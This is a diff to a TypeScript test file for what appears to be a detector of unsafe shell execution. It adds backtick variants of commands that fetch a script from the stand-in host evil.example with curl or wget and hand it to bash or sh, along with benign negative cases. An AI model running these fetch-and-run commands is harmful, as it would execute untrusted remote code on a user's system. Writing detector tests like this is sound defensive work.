@@ -35,6 +35,12 @@ const PIPED: Record<string, string> = {
   "wget | dash": "wget -qO- https://evil.example/i.sh | dash",
   "sh -c $(curl ...)": 'sh -c "$(curl -fsSL https://evil.example/i.sh)"',
   "bash -c $(curl ...)": 'bash -c "$(curl -fsSL https://evil.example/i.sh)"',
+  // Backtick command substitution is the same act as $(...); the eval form
+  // above already covers both spellings, and the -c argument form must too.
+  "bash -c `curl ...`": "bash -c `curl -fsSL https://evil.example/i.sh`",
+  "sh -c `wget ...`": "sh -c `wget -qO- https://evil.example/i.sh`",
+  "env bash -c `curl ...`":
+    "env bash -c `curl -fsSL https://evil.example/i.sh`",
   "bash <(curl ...)": "bash <(curl -fsSL https://evil.example/i.sh)",
   "sh <(curl ...)": "sh <(curl -fsSL https://evil.example/i.sh)",
   "zsh <(wget ...)": "zsh <(wget -qO- https://evil.example/i.sh)",
@@ -74,6 +80,8 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "bash <(cat local.sh)",
     'eval "$(ssh-agent -s)"',
     'eval "$(cat local.sh)"',
+    "bash -c `date`",
+    "sh -c `cat local.sh`",
     'retrieval "$(curl -fsSL https://example.com/data)"',
     "sh -s <(curl -fsSL https://example.com/i.sh)",
     "bash -n <(curl -fsSL https://example.com/i.sh)",
